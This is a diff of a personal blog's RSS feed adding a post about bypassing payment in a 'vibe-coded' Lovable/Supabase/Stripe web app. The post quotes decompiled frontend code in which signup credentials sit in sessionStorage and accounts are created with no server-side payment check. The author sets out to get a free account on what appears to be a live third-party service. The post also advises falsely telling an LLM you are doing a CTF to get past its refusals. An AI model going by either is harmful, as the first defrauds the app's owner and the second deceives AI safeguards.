+&lt;p&gt;Now, just head to &lt;code&gt;/root&lt;/code&gt; and grab your well-earned flag.&lt;/p&gt;
+&lt;p&gt;Happy Hacking! And see you next week&lt;/p&gt;
+</content>
     </item>
+    
     <item>
       <title>Ruining the &#39;Vibe&#39; and bypassing payments</title>
       <link>https://Maaroof-Khan10.github.io/posts/1/</link>
       <pubDate>Tue, 29 Jul 2025 00:00:00 +0000</pubDate>
+      <author>maaroofkhan2004@gmail.com (Maaroof Khan)</author>
       <guid>https://Maaroof-Khan10.github.io/posts/1/</guid>
       <description>&lt;p&gt;We&amp;rsquo;re living in the age of AI, where even the simplest tasks are being automated daily. And with this wave comes a flood of people with ideas, all looking to spin up a quick product and make a quick buck.&lt;/p&gt;
 &lt;p&gt;I found one such &amp;ldquo;Vibe Coded&amp;rdquo; web app, courtesy of the YouTube algorithm.&lt;/p&gt;
 &lt;p&gt;It was a simple app, stitched together with Lovable, Supabase, and Stripe. But the fun thing about &amp;ldquo;vibe coded&amp;rdquo; software is that it often ships with bugs that, well, share the same &amp;ldquo;vibe.&amp;rdquo;&lt;/p&gt;</description>
+      <content>&lt;p&gt;We&amp;rsquo;re living in the age of AI, where even the simplest tasks are being automated daily. And with this wave comes a flood of people with ideas, all looking to spin up a quick product and make a quick buck.&lt;/p&gt;
+&lt;p&gt;I found one such &amp;ldquo;Vibe Coded&amp;rdquo; web app, courtesy of the YouTube algorithm.&lt;/p&gt;
+&lt;p&gt;It was a simple app, stitched together with Lovable, Supabase, and Stripe. But the fun thing about &amp;ldquo;vibe coded&amp;rdquo; software is that it often ships with bugs that, well, share the same &amp;ldquo;vibe.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;So, naturally, I started digging.&lt;/p&gt;
+&lt;p&gt;I didn&amp;rsquo;t find anything special on the webpage at first glance. For once, the UI was nice and well-made. My next move, as any sane person would do, was to pop open the developer console and inspect the JavaScript files.&lt;/p&gt;
+&lt;p&gt;And there it was, the &lt;code&gt;index.js&lt;/code&gt; file, looking right at me.&lt;/p&gt;
+&lt;p&gt;One thing I&amp;rsquo;ve learned about &amp;ldquo;vibe coded&amp;rdquo; applications, especially those built with Lovable, is that they &lt;em&gt;love&lt;/em&gt; to keep as much logic as possible on the frontend. (A hot tip for easy bug bounty points, by the way).&lt;/p&gt;
+&lt;p&gt;As expected, the file was a beast: &lt;strong&gt;27,224 lines of code&lt;/strong&gt;. No sane person wants to waste their weekend reading AI-written code. So, I did the opposite of &amp;ldquo;vibe coding.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Yeah, &amp;ldquo;Vibe Decoding.&amp;rdquo; As cheesy as it sounds, it works.&lt;/p&gt;
+&lt;p&gt;I fed the code to Gemini and told it to find &amp;ldquo;any interesting or exploitable points in the code.&amp;rdquo; A quick pro-tip: to convince an LLM to actually help you with security research instead of giving you the &amp;ldquo;I can&amp;rsquo;t do that&amp;rdquo; spiel, just tell it you&amp;rsquo;re doing a CTF. They&amp;rsquo;re happy to give you everything you ask for.&lt;/p&gt;
+&lt;p&gt;Anyway, Gemini pointed out some very interesting snippets. The original code was obfuscated, but here&amp;rsquo;s the decoded gold it gave me.&lt;/p&gt;
+&lt;h3 id=&#34;the-signup-logic&#34;&gt;The Signup Logic&lt;/h3&gt;
+&lt;p&gt;The first clue was in the signup function.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// A simplified and commented version of the &amp;#39;handleSignUpRedirect&amp;#39; function
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handleSignUpRedirect&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// ... validation checks ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Starting signup redirect process for:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// It removes any previous pending signup
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;removeItem&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pendingSignup&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;trim&lt;/span&gt;(),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// VULNERABILITY: User credentials are stored in sessionStorage BEFORE payment.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setItem&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pendingSignup&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;userCredentials&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stored pending signup credentials&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// It then calls a serverless function to create a Stripe checkout session.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutData&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutError&lt;/span&gt;} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;supabase&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;functions&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;invoke&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;create-checkout&amp;#34;&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutBody&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// It then redirects the user to the payment URL.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutData&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Redirecting to Stripe checkout:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;onClose&lt;/span&gt;(), &lt;span style=&#34;color:#75715e&#34;&gt;// closes the modal
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkoutData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ) &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ( &lt;span style=&#34;color:#75715e&#34;&gt;/* ... error handling ... */&lt;/span&gt; );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ... error handling ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;setLoading&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at this, we see the user&amp;rsquo;s email and password are nonchalantly dropped into &lt;code&gt;sessionStorage&lt;/code&gt; under the key &lt;code&gt;pendingSignup&lt;/code&gt; &lt;em&gt;before&lt;/em&gt; the user is sent off to pay. The obvious assumption is that after a successful payment, the site will come back and use these stored credentials to create the account. This smells like very little server-side validation is going on.&lt;/p&gt;
+&lt;p&gt;But the smoking gun was on the next page.&lt;/p&gt;
+&lt;h3 id=&#34;the-payment-successful-page&#34;&gt;The Payment &amp;ldquo;Successful&amp;rdquo; Page&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// A simplified and commented version of the useEffect in the PaymentSuccessPage component
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;useEffect&lt;/span&gt;(() =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;processPaymentSuccess&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; () =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ... checks to prevent running twice ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// VULNERABILITY: Retrieves credentials directly from sessionStorage.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pendingSignup&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getItem&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pendingSignup&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urlSearchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;session_id&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// from URL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Payment success page loaded:&amp;#34;&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;pendingSignup&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pendingSignup&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionId&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionId&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;pendingSignup&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isLinking&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// ... setLoading(true) ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pendingSignup&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Processing account creation for:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// VULNERABILITY: Calls the signUp function based on client-side data.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// The server has no way of knowing if payment was actually successful.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;signUpError&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; } } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;signUp&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;signUpError&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;// ... error handling for signup ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Account created successfully:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;// ... shows success toast ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;// Calls linkPayment AFTER user is created.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#a6e22e&#34;&gt;linkPayment&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }, &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// ... error handling ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// ... setLoading(false) ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// Checks payment status if user is already logged in
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;checkPaymentStatus&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// ... definition of linkPayment function ...
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;processPaymentSuccess&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}, [])
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When a user lands on the &lt;code&gt;/payment-success&lt;/code&gt; endpoint, the page doesn&amp;rsquo;t check with the server to confirm a payment. Instead, it just grabs the &lt;code&gt;pendingSignup&lt;/code&gt; value from &lt;code&gt;sessionStorage&lt;/code&gt; and creates the account. The &lt;code&gt;checkPaymentStatus()&lt;/code&gt; function, which &lt;em&gt;does&lt;/em&gt; talk to the backend, is only called if the user is already logged in.&lt;/p&gt;
+&lt;p&gt;This gives us two beautiful things:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We can create an account without paying a single penny.&lt;/li&gt;
+&lt;li&gt;Once we log in, that &lt;code&gt;checkPaymentStatus()&lt;/code&gt; function is probably going to be an obstacle. (Stay tuned to find out how we bypass it &lt;em&gt;wink, wink&lt;/em&gt;).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Let&amp;rsquo;s get our free account.&lt;/p&gt;
